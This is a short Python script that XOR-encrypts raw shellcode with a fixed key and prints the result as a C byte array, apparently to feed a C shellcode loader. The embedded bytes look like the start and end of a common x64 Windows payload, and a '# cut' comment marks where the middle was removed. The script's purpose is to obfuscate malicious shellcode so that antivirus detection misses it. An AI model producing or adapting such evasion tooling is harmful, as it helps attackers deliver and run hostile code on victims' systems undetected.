# -*- coding: utf-8 -*-
# XOR shellcode encryptor for C usage

def xor(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    key_len = len(key_bytes)
    return bytes([b ^ key_bytes[i % key_len] for i, b in enumerate(data)])

def xor_encrypt(data: bytes, key: str):
    encrypted = xor(data, key)
    print("unsigned char shellcode[] = {")
    for i in range(0, len(encrypted), 12):
        chunk = encrypted[i:i+12]
        line = ", ".join(f"0x{b:02x}" for b in chunk)
        print(f"  {line},")
    print("};")

# Paste your raw shellcode here (as bytes)
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
# cut
buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
buf += b"\x89\xda\xff\xd5"

# 🔐 Secret key
my_secret_key = "XORKEYENCENCENC"

# 🔒 Encrypt and print
xor_encrypt(buf, my_secret_key)